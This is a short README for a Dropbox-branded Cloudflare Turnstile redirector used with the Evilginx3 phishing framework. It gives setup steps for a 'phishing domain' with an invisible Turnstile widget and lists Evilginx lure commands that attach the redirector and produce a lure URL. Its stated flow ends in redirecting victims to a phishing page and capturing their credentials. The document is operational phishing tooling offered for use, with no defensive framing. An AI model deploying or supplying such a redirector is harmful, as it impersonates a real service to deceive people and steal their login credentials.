# Dropbox Turnstile Redirector

Dropbox-branded Cloudflare Turnstile verification page for Evilginx3.

## Setup

1. **Create Turnstile Site** in Cloudflare dashboard
   - Domain: Your phishing domain
   - Widget Mode: Invisible
   - Copy Site Key

2. **Configure Redirector**
   - Edit `index.html`
   - Replace `'YOUR_TURNSTILE_SITE_KEY'` with your Site Key

3. **Use with Lure**
   ```bash
   lures create dropbox
   lures edit <id> redirector dropbox_turnstile
   lures get-url <id>
   ```

## How It Works

Lure URL → Dropbox verification → Turnstile check → Redirect to phishing page → Capture credentials
